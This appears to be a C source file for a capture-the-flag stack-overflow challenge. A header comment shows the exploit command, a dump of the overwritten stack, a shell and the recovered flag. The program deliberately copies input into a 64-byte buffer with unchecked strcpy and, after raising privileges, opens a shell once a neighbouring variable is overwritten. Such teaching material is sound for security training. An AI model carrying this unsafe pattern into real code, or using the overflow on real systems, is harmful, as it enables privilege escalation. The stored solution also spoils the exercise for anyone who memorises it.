/*
$ ./stack_overwrite `python -c 'print "\x90"*80 + "\x01"'`
Stack dump:
0xffffd618: 0x00001f4d
0xffffd614: 0xffffd802 (second argument)
0xffffd610: 0x00000001 (first argument)
0xffffd60c: 0x90909090 (saved eip)
0xffffd608: 0x90909090 (saved ebp)
0xffffd604: 0x90909090
0xffffd600: 0x90909090
0xffffd5fc: 0x90909090
0xffffd5f8: 0x90909090
0xffffd5f4: 0x90909090
0xffffd5f0: 0x90909090
0xffffd5ec: 0x90909090
0xffffd5e8: 0x90909090
0xffffd5e4: 0x90909090
0xffffd5e0: 0x90909090
0xffffd5dc: 0x90909090
0xffffd5d8: 0x90909090
0xffffd5d4: 0x90909090
0xffffd5d0: 0x90909090
0xffffd5cc: 0x90909090
0xffffd5c8: 0x90909090
0xffffd5c4: 0x90909090
0xffffd5c0: 0x90909090 (beginning of buffer)
win = 1
sh-4.2$ cat key
this_is_why_i_store_everything_on_the_heap
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"

void vuln(int win, char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 23, (void **) &win);
    printf("win = %d\n", win);
    if (win == 1) {
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Sorry, you lose.\n");
    }
    exit(0);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: stack_overwrite [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(0, argv[1]);
    return 0;
}
